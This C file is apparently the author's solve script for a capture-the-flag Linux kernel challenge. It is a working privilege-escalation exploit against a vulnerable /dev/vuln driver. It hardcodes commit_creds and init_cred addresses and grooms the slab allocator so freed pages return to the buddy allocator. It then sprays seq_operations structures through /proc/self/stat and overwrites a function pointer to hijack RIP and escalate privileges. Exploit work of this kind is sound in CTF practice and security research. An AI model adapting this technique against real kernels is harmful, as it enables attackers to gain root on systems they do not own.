#include "libpwn.c"
#define addr_init_cred      0xffffffff81e3bfa0
#define addr_commit_creds   0xffffffff812a1050

int main(){
  // Author Solve Script Solution
  save_state();
    
  fd = open("/dev/vuln", O_RDONLY);
  if (fd < 0) error("Failed fd open");

  int objs_per_slab = 8;
  int cpu_partial = 52;
  int num_sprary = objs_per_slab * (cpu_partial + 1);

  printf("[*] Allocating %#x objects to obtain %#x full slabs\n", num_sprary, cpu_partial + 1);
  for (int i = 0; i < num_sprary; i++) {
      obj_alloc(i);
  }

  puts("[*] Allocating 0x1 object to obtain new active slab");
  obj_alloc(num_sprary);

  puts("[*] Freeing objects to release order-0 pages back to the buddy allocator");
  for (int i = 0; i < num_sprary; i += objs_per_slab) {
      if (i % (objs_per_slab * 2) == 0) {
          for (int j = i; j < i + objs_per_slab; j++) {
              obj_free(j);
          }
      } else {
          obj_free(i);
      }
  }
  
  puts("[*] Spraying struct seq_operations to reclaim order-0 pages");
  for (int i = 0; i < 0x20; i++) {
      seq_fd[i] = open("/proc/self/stat", O_RDONLY);
      if (seq_fd[i] < 0) error("Failed seq_fd open");
  }
  
  puts("[*] Hijacking RIP");
  char payload[0x8];
  *(unsigned long *)&payload = (unsigned long)escalate_privilege;

  for (int i = 0; i < num_sprary; i += objs_per_slab) {
      if (i % (objs_per_slab * 2) == 0) {
          obj_write(i, payload, 0x8);
      }
  }
  
  for (int i = 0; i < 0x20; i++) {
      read(seq_fd[i], payload, 1);
  }

}
